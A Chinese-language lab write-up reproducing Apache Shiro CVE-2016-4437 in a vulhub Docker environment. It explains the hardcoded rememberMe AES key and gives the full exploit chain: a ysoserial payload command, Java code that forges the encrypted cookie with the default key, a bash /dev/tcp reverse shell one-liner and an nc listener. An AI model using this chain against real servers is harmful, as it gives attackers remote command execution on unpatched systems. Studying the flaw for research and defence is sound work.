***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 0x00 简介

Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。

Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。

## 0x01 启动环境

    
    
    cd /vulhub/shiro/cve-2016-4437  
    ​  
    docker-compose up -d  
    ​  
    # 注意：启动端口8080，若冲突请修改

## 0x02 漏洞分析

### 1 搭建测试环境

使用IDEA创建maven项目并导入依赖

    
    
    <?xml version="1.0" encoding="UTF-8"?>  
    <project xmlns="http://maven.apache.org/POM/4.0.0"  
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">  
    <modelVersion>4.0.0</modelVersion>  
    ​  
    <groupId>org.example</groupId>  
    <artifactId>Shiro</artifactId>  
    <version>1.0-SNAPSHOT</version>  
    ​  
    <properties>  
    <maven.compiler.source>8</maven.compiler.source>  
    <maven.compiler.target>8</maven.compiler.target>  
    </properties>  
    ​  
    <dependencies>  
    <dependency>  
    <groupId>junit</groupId>  
    <artifactId>junit</artifactId>  
    <version>4.12</version>  
    <scope>compile</scope>  
    </dependency>  
    <dependency>  
    <groupId>org.apache.shiro</groupId>  
    <artifactId>shiro-core</artifactId>  
    <version>1.2.4</version>  
    </dependency>  
    </dependencies>  
    </project>

shiro组件自然是必须的，junit纯属方便测试(复习一下)

项目结构：

![1619581010_6088d8524bf341b9e62d9.png!small?1619581011033](https://image.3001.net/images/20210428/1619581010_6088d8524bf341b9e62d9.png!small?1619581011033)

注意：poc.ser的路径相对于项目根路径

![1619581023_6088d85f3eb3f1a7710de.png!small?1619581023947](https://image.3001.net/images/20210428/1619581023_6088d85f3eb3f1a7710de.png!small?1619581023947)

### 2 漏洞分析

根据大佬的文章可知问题出在：`org.apache.shiro.mgt.AbstractRememberMeManager`

打开源码进行分析：

![1619581032_6088d8687c758226e5541.png!small?1619581033383](https://image.3001.net/images/20210428/1619581032_6088d8687c758226e5541.png!small?1619581033383)

26行定义了默认key，32行构造函数用默认的key对加密密钥进行赋值

![1619581061_6088d8857ebaf3963c32f.png!small?1619581062583](https://image.3001.net/images/20210428/1619581061_6088d8857ebaf3963c32f.png!small?1619581062583)

167行使用密钥进行AES解密，也就是默认的密钥

综上，由于AES默认密钥是固定的，如果开发者没有手动修改则可以操控反序列化的数据进而getshell

## 0x03 漏洞复现

### 1 生成字节码文件

    
    
    java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > poc.ser

![1619581069_6088d88d1d98fd75d4eb7.png!small?1619581069800](https://image.3001.net/images/20210428/1619581069_6088d88d1d98fd75d4eb7.png!small?1619581069800)

将字节码文件拷贝到项目中

### 2 编写代码进行AES加密

    
    
    import org.apache.shiro.codec.Base64;  
    import org.apache.shiro.codec.CodecSupport;  
    import org.apache.shiro.crypto.AesCipherService;  
    import org.apache.shiro.util.ByteSource;  
    ​  
    import java.io.IOException;  
    import java.nio.file.FileSystems;  
    import java.nio.file.Files;  
    ​  
    import org.junit.Test;  
    public class ShiroTest {  
    @Test  
    public void RCE() throws IOException  
    {  
    byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("", "", "poc.ser"));  
    ​  
    AesCipherService aes = new AesCipherService();  
    byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));  
    ​  
    ByteSource ciphertext = aes.encrypt(payloads, key);  
    System.out.printf(ciphertext.toString());  
    }  
    }

### 3 替换cookie

![1619581084_6088d89c4a1ad2f1df4bc.png!small?1619581085308](https://image.3001.net/images/20210428/1619581084_6088d89c4a1ad2f1df4bc.png!small?1619581085308)

### 4 进入docker镜像查看效果

![1619581090_6088d8a25779d6ac766e7.png!small?1619581091090](https://image.3001.net/images/20210428/1619581090_6088d8a25779d6ac766e7.png!small?1619581091090)

成功创建文件

### 5 反弹shell

1 制作命令

    
    
    # 反弹shell的命令，注意：>& 之间不能有空格  
    bash -i >& /dev/tcp/ip/port 0>& 1

在线转换网址：<http://www.jackson-t.ca/runtime-exec-payloads.html>

![1619581097_6088d8a9da505bfaa0d5d.png!small?1619581098854](https://image.3001.net/images/20210428/1619581097_6088d8a9da505bfaa0d5d.png!small?1619581098854)

2 使用ysoserial生成字节码并用上面的代码生成加密的cookie

![1619581106_6088d8b289bebea27c8f5.png!small?1619581107307](https://image.3001.net/images/20210428/1619581106_6088d8b289bebea27c8f5.png!small?1619581107307)

3 在攻击终端中开启nc监听

    
    
    # 监听连接  
    nc -lvp port

![1619581113_6088d8b9f3f13c1be787d.png!small?1619581114721](https://image.3001.net/images/20210428/1619581113_6088d8b9f3f13c1be787d.png!small?1619581114721)

4 修改cookie并发送

![1619581121_6088d8c1b96095b8daff3.png!small?1619581122898](https://image.3001.net/images/20210428/1619581121_6088d8c1b96095b8daff3.png!small?1619581122898)

5 查看监听情况

![1619581126_6088d8c65e28b3964502e.png!small?1619581127246](https://image.3001.net/images/20210428/1619581126_6088d8c65e28b3964502e.png!small?1619581127246)

NICE，成功返回shell

## 0x04 Q&A

Q：为什么命令要编码？

A：因为重定向符号在网络上传输会乱码 —— legend

Q：为什么图片IP不一样？

A：因为作者垃圾，实验做了好几次，环境不一样

